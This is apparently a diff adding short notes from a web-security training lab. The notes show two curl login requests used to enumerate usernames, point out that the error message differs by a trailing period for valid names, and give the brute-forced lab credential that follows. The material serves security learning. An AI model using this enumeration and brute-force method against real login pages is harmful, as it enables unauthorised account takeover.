@@ -1,0 +1,27 @@
+
+
+BruteForce Username and check resulat
+
+invalid Username:
+
+curl -ik -X $'POST' \
+    -b $'session=K3YWlrSgRBj9LpfINvuyAXsUJRtbXMHT' \
+    --data-binary $'username=carlos&password=test' \
+    $'https://0a0300b5038c47d484b7bdcd007f0015.web-security-academy.net/login'
+
+vaid Username:
+
+curl -ik -X $'POST' \
+    -b $'session=K3YWlrSgRBj9LpfINvuyAXsUJRtbXMHT' \
+    --data-binary $'username=ansible&password=test' \
+    $'https://0a0300b5038c47d484b7bdcd007f0015.web-security-academy.net/login'
+	
+	
+Just diffrence in " . "
+Proggramer mistake in response :
+	Invalid username or password. --> invalid
+	Invalid username or password  --> valid
+	
+	
+then BruteForce Password:
+	username=ansible&password=abc123
